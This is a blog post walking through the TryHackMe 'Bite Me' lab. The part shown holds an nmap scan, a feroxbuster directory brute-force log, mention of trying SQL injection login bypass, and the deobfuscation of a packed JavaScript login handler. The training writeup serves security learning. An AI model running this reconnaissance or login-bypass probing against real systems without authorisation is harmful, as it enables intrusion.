<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Bite Me TryHackMe Detailed Writeup and Walkthrough" /><meta name="author" content="Gaurav Raj" /><meta property="og:locale" content="en_US" /><meta name="description" content="Information" /><meta property="og:description" content="Information" /><link rel="canonical" href="https://blog.gauravraj.xyz/posts/biteme-tryhackme-detailed-writeup-and-walkthrough/" /><meta property="og:url" content="https://blog.gauravraj.xyz/posts/biteme-tryhackme-detailed-writeup-and-walkthrough/" /><meta property="og:site_name" content="Gaurav Raj" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-17T12:58:30+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Bite Me TryHackMe Detailed Writeup and Walkthrough" /><meta name="twitter:site" content="@thehackersbrain" /><meta name="twitter:creator" content="@Gaurav Raj" /><meta name="google-site-verification" content="ahcmaTMnM-_vajNE0RxVYQKJgJvAYyz_GHN_I2RvwCY" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Gaurav Raj"},"@type":"BlogPosting","description":"Information","dateModified":"2022-03-17T12:58:30+05:30","datePublished":"2022-03-17T12:58:30+05:30","headline":"Bite Me TryHackMe Detailed Writeup and Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.gauravraj.xyz/posts/biteme-tryhackme-detailed-writeup-and-walkthrough/"},"url":"https://blog.gauravraj.xyz/posts/biteme-tryhackme-detailed-writeup-and-walkthrough/","@context":"https://schema.org"}</script><title>Bite Me TryHackMe Detailed Writeup and Walkthrough | Gaurav Raj</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Gaurav Raj"><meta name="application-name" content="Gaurav Raj"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-ZWRQJRHCFP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-ZWRQJRHCFP'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/profile/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Gaurav Raj</a></div><div class="site-subtitle font-italic">Hacker, Programmer & FreeLancer</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/thehackersbrain" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt social-icons"></i> </a> <a href="https://twitter.com/thehackersbrain" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter social-icons"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['techw803','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope social-icons"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss social-icons"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG ‚Ä∫ <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Bite Me TryHackMe Detailed Writeup and Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Bite Me TryHackMe Detailed Writeup and Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Gaurav Raj </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Mar 17, 2022, 12:58 PM +0530" prep="on" > Mar 17 <i class="unloaded">2022-03-17T12:58:30+05:30</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2223 words">12 min</span></div></div><div class="post-content"><h1 id="information">Information</h1><h3 id="target-ip">Target IP</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">IP</span><span class="o">=</span>10.10.73.114
</pre></table></code></div></div><h1 id="enumeration">Enumeration</h1><h2 id="nmap-scan">Nmap Scan</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.92 scan initiated Mon Mar 14 15:35:58 2022 as: nmap -sC -sV -A -v -oA nmap/initial 10.10.73.114</span>
Nmap scan report <span class="k">for </span>10.10.73.114
Host is up <span class="o">(</span>0.34s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 <span class="o">(</span>RSA<span class="o">)</span>
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
TCP/IP fingerprint:
OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.92%E<span class="o">=</span>4%D<span class="o">=</span>3/14%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>34267%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>622F13B
OS:2%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>108%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS
OS:<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M505ST11NW6%O2<span class="o">=</span>M505ST11NW6%O3<span class="o">=</span>M505NNT11NW6%O4<span class="o">=</span>M505ST11NW6%O5<span class="o">=</span>M505ST1
OS:1NW6%O6<span class="o">=</span>M505ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>F4B3%W2<span class="o">=</span>F4B3%W3<span class="o">=</span>F4B3%W4<span class="o">=</span>F4B3%W5<span class="o">=</span>F4B3%W6<span class="o">=</span>F4B3<span class="o">)</span>ECN
OS:<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>F507%O<span class="o">=</span>M505NNSNW6%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>A
OS:S%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span>R
OS:<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F
OS:<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%
OS:T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD
OS:<span class="o">=</span>S<span class="o">)</span>

Uptime guess: 13.534 days <span class="o">(</span>since Tue Mar  1 02:48:13 2022<span class="o">)</span>
Network Distance: 2 hops
TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>264 <span class="o">(</span>Good luck!<span class="o">)</span>
IP ID Sequence Generation: All zeros
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 3389/tcp<span class="o">)</span>
HOP RTT       ADDRESS
1   503.58 ms 10.8.0.1
2   503.78 ms 10.10.73.114

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon Mar 14 15:36:42 2022 -- 1 IP address (1 host up) scanned in 43.79 seconds</span>
</pre></table></code></div></div><p>From the about <strong>NMAP</strong> Scan result, we get 2 open <strong>ports</strong>, <strong>22 - SSH ** &amp; **80 - HTTP</strong>. So first of all, we will take a look at the <strong>HTTP</strong> Server on port <strong>80.</strong></p><h2 id="http-enumeration">HTTP Enumeration</h2><p>After visiting the <strong>HTTP</strong> Server, we can see that, this is the default <strong>Apache2</strong> webpage. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317193154.png" alt="" /> Checking for the <strong>HTML</strong> Source code, for anything interesting, but no luck so far. Now moving to the next step, we‚Äôll start a <strong>directory busting</strong> for any interesting files or any directories that are hidden from us.</p><h3 id="directory-busting">Directory Busting</h3><p>So for this purpose alone, we have many tools available such as: <strong>dirb</strong>, <strong>dirbuster</strong>, <strong>gobuster</strong>, <strong>fuff</strong> and so much that the list may go on forever. but recently I‚Äôve switched from <strong>ffuf</strong> to <strong>feroxbuster</strong>. This tools is written in <strong>rust</strong> and is supposed to be faster than the existing ones that we already know. so just trying it out. It all depends on your choice, which you want to use or are most comfortable with, Anyway enough talking, let‚Äôs get back to our enumeration. here the scan results.</p><h4 id="feroxbuster-log">Feroxbuster Log</h4><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>elliot@archlinux<span class="o">)</span>-[~/data/biteme]-[192.168.225.72]-[]
‚îî‚îÄ<span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://10.10.135.235/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher ü§ì                 ver: 2.4.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.135.235/
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 üí•  Timeout <span class="o">(</span>secs<span class="o">)</span>        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.4.0
 üîÉ  Recursion Depth       ‚îÇ 4
 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
301        9l       28w      316c http://10.10.135.235/console
301        9l       28w      320c http://10.10.135.235/console/css
301        9l       28w      327c http://10.10.135.235/console/securimage
301        9l       28w      336c http://10.10.135.235/console/securimage/database
üö® Caught ctrl+c üö® saving scan state to ferox-http_10_10_135_235_-1647525946.state ...
<span class="o">[</span><span class="c">#&gt;------------------] - 1m      9588/149995  22m     found:4       errors:1019</span>
<span class="o">[</span><span class="c">##&gt;-----------------] - 1m      3740/29999   40/s    http://10.10.135.235/</span>
<span class="o">[</span><span class="c">#&gt;------------------] - 1m      2547/29999   33/s    http://10.10.135.235/console</span>
<span class="o">[</span><span class="c">#&gt;------------------] - 1m      2122/29999   28/s    http://10.10.135.235/console/css</span>
<span class="o">[&gt;</span><span class="nt">-------------------</span><span class="o">]</span> - 58s      743/29999   12/s    http://10.10.135.235/console/securimage
<span class="o">[&gt;</span><span class="nt">-------------------</span><span class="o">]</span> - 49s      431/29999   8/s     http://10.10.135.235/console/securimage/database
‚îå‚îÄ‚îÄ<span class="o">(</span>elliot@archlinux<span class="o">)</span>-[~/data/biteme]-[192.168.225.72]-[]
‚îî‚îÄ<span class="err">$</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317194133.png" alt="" /> Looking at the scan results, we have some intersting endpoints discovered, that we didn‚Äôt knew before.</p><ol><li><strong>/console - 301</strong><li><strong>/console/secureimages - 301</strong><li><strong>/console/secureimages/database - 301</strong></ol><p>Let‚Äôs explore and enumerate all the endpoints one by one. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317194423.png" alt="" /> As we can see from the above image, <strong>/console</strong> endpoint have a login form, and the <strong>/secureimage</strong> is some <strong>php</strong> library for handling the <strong>captcha</strong> code on the login form. After checking for default credentials and also any type of login bypass like, <strong>Database Injection</strong> like <strong>SQLi</strong> or using default credentials, nothing worked.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317194905.png" alt="" /></p><ol><li><p>while looking at the <strong>source code</strong> of the page, found a javascript function named <strong>handleSubmit()</strong></p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">handleSubmit</span><span class="p">()</span> <span class="p">{</span>
  <span class="nb">eval</span><span class="p">(</span>
    <span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">e</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
      <span class="p">};</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="dl">""</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span> <span class="nb">String</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span> <span class="nx">r</span><span class="p">[</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">||</span> <span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
        <span class="nx">k</span> <span class="o">=</span> <span class="p">[</span>
          <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">r</span><span class="p">[</span><span class="nx">e</span><span class="p">];</span>
          <span class="p">},</span>
        <span class="p">];</span>
        <span class="nx">e</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
          <span class="k">return</span> <span class="dl">"</span><span class="se">\\</span><span class="s2">w+</span><span class="dl">"</span><span class="p">;</span>
        <span class="p">};</span>
        <span class="nx">c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">while</span> <span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="dl">"</span><span class="se">\\</span><span class="s2">b</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\\</span><span class="s2">b</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">g</span><span class="dl">"</span><span class="p">),</span> <span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span>
      <span class="k">return</span> <span class="nx">p</span><span class="p">;</span>
    <span class="p">})(</span>
      <span class="dl">"</span><span class="s2">0.1('2').3='4';5.6('@7 8 9 a b c d e f g h i... j');</span><span class="dl">"</span><span class="p">,</span>
      <span class="mi">20</span><span class="p">,</span>
      <span class="mi">20</span><span class="p">,</span>
      <span class="dl">"</span><span class="s2">document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason</span><span class="dl">"</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span>
        <span class="dl">"</span><span class="s2">|</span><span class="dl">"</span>
      <span class="p">),</span>
      <span class="mi">0</span><span class="p">,</span>
      <span class="p">{}</span>
    <span class="p">)</span>
  <span class="p">);</span>
  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></ol><p>After deobfuscating the code, a bit more we found this. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317195356.png" alt="" /></p><ol><li>The <strong>js</strong> deobfuscator tool, can be found on github <a href="https://lelinhtinh.github.io/de4js/">here</a><li>Pasting in the obfuscated js code. As we can see from the obfuscated code that it is using <strong>packer</strong> through <strong>eval()</strong> function. So selecting the package in obfuscator tool.<li>Here we got the deobfuscated js code.<div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">handleSubmit</span><span class="p">()</span> <span class="p">{</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">clicked</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">yes</span><span class="dl">"</span><span class="p">;</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
    <span class="dl">"</span><span class="s2">@fred I turned on php file syntax highlighting for you to review... jason</span><span class="dl">"</span>
  <span class="p">);</span>
  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
